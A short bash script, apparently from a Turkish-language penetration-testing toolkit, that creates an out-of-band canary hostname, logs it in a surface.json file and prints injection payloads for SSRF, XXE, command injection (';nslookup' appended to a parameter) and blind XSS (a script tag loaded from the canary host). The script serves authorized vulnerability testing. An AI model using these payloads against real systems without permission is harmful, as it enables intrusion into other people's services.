#!/usr/bin/env bash
set -euo pipefail
SURF="${1:-}"; HOST="${2:-}"; PARAM="${3:-}"; CLS="${4:-}"; DOM="${5:-}"
[[ -z "$SURF" || -z "$HOST" || -z "$CLS" ]] && { echo "KULLANIM: oob_canary.sh <surface.json> <host> <param> <class> [oob_domain]" >&2; exit 2; }
[[ -f "$SURF" ]] || { echo "HATA: surface.json yok: $SURF" >&2; exit 3; }
command -v jq >/dev/null || { echo "HATA: jq gerekli" >&2; exit 3; }

[[ -z "$DOM" ]] && DOM="${OOB_DOMAIN:-}"
[[ -z "$DOM" ]] && DOM="$(jq -r '.run.oob_domain // ""' "$SURF")"
if [[ -z "$DOM" ]]; then
  echo "UYARI: oob_domain yok. Cypture QuickSSRF sekmesinden domain'i al ve şu şekilde ver:" >&2
  echo "  bash scripts/oob_canary.sh $SURF $HOST '$PARAM' $CLS <quickssrf_domain>" >&2
  exit 4
fi

TOKEN="$(head -c5 /dev/urandom 2>/dev/null | od -An -tx1 | tr -d ' \n' || echo "$RANDOM$RANDOM")"
FQDN="${CLS}-${TOKEN}.${DOM}"

jq --arg h "$HOST" --arg p "$PARAM" --arg c "$CLS" --arg tok "$TOKEN" --arg fq "$FQDN" --arg dom "$DOM" '
  .run //= {} | .run.oob_domain = $dom
  | .oob_canaries //= []
  | .oob_canaries += [{token:$tok, fqdn:$fq, host:$h, param:$p, class:$c,
                       injected:true, confirmed:false, poll_count:0}]
' "$SURF" > "$SURF.tmp" && mv "$SURF.tmp" "$SURF"

echo "OOB CANARY [$HOST/$CLS] → payload'a ŞUNU enjekte et (Cypture ile):"
echo "  $FQDN"
echo "  (SSRF: param=$FQDN · XXE: SYSTEM \"http://$FQDN\" · cmd: ;nslookup $FQDN · blind-XSS: <script src=//$FQDN>)"
echo "Sonra dalga sonu: bash scripts/oob_poll.sh $SURF <cyp_search_json>  (callback geldiyse high-conf sinyal)."
